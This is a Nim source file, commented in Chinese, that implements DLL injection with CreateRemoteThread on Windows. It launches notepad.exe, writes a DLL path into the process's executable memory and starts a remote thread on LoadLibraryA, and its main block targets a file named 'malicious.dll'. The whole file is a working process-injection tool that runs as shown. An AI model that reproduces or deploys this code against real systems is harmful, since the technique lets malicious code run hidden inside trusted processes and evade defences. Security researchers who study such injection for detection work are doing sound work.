import winim/lean 
import osproc

proc injectCreateRemoteThread(dllPath: string): void = 
  let dwSize = cast[SIZE_T](dllPath.len)
  let newProcess = startProcess("notepad.exe");
  #newProcess.suspend() # 解除注释后notepad弹窗就会消失
  defer: newProcess.close()
  # 在该进程结束后退出
  echo "[*] Injecting: ", dllPath
  echo "[*] Target Process: ", newProcess.processID
  Sleep(500)
  
  # 打开刚创建的进程
  let pHandle = OpenProcess(
    PROCESS_ALL_ACCESS,
    false,
    cast[DWORD](newProcess.processID)
  )
  defer: CloseHandle(pHandle)
  echo "[*] pHandle: ", pHandle

  # 为即将注入dll的路径在目标进程空间中申请一块内存
  let pDllAddr = VirtualAllocEx(
    pHandle,
    NULL,
    dwSize,
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
  )

  var bytesWritten: SIZE_T 
  # 将dll的绝对路径写到刚申请的内存中
  let wSuccess = WriteProcessMemory(
    pHandle,
    pDllAddr,
    dllPath.cstring,
    dwSize,
    addr bytesWritten
  )
  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  # 以下三种方法都是为了找到kernel32加载基地址
  # 法一：
  #let pFuncProcAddr = GetProcAddress(
  #  GetModuleHandleA("Kernel32"),
  #  "LoadLibraryA"
  #)
  ##var loadLibraryAddress = cast[LPVOID](GetProcAddress(GetModuleHandle(r"kernel32.dll"), r"LoadLibraryA"))
  # 法二：  需要在之前import dynlib
  #let kernel = loadLib("kernel32") # kernel: LibHandle
  #if isNil(kernel):
  #  echo "[X] Failed to load kernel32.dll"
  #let pFuncProcAddr = kernel.symaddr("LoadLibraryA")
  # 法三：
  let pFuncProcAddr = LoadLibraryA
  echo "[*] Find kernel32 addr: ", if NULL == pFuncProcAddr: false else: true
  echo ""

  # 使用CreateRemoteThread函数创建一个在其它进程地址空间中运行的线程
  let tHandle = CreateRemoteThread(
    pHandle,
    NULL,
    0,
    cast[LPTHREAD_START_ROUTINE](pFuncProcAddr),
    pDllAddr,
    0,
    NULL
  )
  defer: CloseHandle(tHandle)

  echo "[*] tHandle: ", tHandle
  echo "[+] Injected"

when isMainModule:
  var file = "C:/users/user/desktop/malicious.dll"
  injectCreateRemoteThread(file)

# nim c -r proc_inj_createremotethread.nim